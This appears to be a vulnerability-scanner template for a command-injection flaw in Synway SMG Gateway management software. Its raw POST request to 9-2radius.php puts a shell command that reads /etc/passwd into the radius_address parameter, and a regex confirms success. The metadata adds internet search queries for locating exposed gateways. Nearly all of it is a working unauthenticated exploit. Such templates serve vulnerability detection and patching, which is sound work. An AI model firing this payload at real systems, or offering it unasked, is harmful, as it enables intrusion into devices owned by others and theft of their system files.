http:
- matchers:
  - name: linux
    part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  raw:
  - 'POST /en/9-2radius.php?authority=6 HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip

    Content-Type: application/x-www-form-urlencoded


    save=1&enable_radius=1&radius_address=/'';cat /etc/passwd;+#

    '
id: sanhuismg-radius-rce
info:
  author: Chenkh
  description: 'Synway SMG Gateway Management Software contains a remote command execution
    vulnerability in 9-2radius.php, where the radius_address parameter is passed to
    a system() call without sanitization. This allows unauthenticated attackers to
    execute arbitrary commands on the server.

    '
  metadata:
    fofa-query: "body=\"text ml10 mr20\" && (title=\"\u7F51\u5173\u7BA1\u7406\u8F6F\
      \u4EF6\" || title=\"Gateway Management\")"
    max-request: 1
    runzero-match: "service[\"http.body\"] matches \"(?i)text ml10 mr20\" && any(each(service[\"\
      html.titles\"]), {# matches \"(?i)(Gateway Management|\u7F51\u5173\u7BA1\u7406\
      \u8F6F\u4EF6)\"})"
    verified: true
  name: Synway SMG Gateway 9-2radius.php - Remote Command Execution
  reference:
  - https://mp.weixin.qq.com/s/PyepoFSuQ63E3RnpQa9nsA
  severity: critical
  tags: gateway,rce,synway,unauth
